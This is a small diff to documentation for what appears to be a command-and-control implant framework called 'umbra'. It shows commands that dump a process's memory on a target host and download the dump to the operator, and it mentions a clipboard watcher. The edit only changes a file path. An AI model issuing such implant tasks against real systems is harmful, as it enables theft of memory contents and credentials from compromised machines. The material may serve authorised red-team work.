@@ -1196,7 +1196,7 @@ pulls it with the ordinary `download` task:
 
 ```bash
 umbra task ws-01 --kind proc.memory --args '{"pid":4242}'
-umbra task ws-01 --kind download --args '{"path":"/home/user/.umbra/memory-4242-1730000000000.dmp"}'
+umbra task ws-01 --kind download --args '{"path":"/home/operator/.umbra/memory-4242-1730000000000.dmp"}'
 ```
 
 The clipboard watcher keeps its queue in the state of the implant
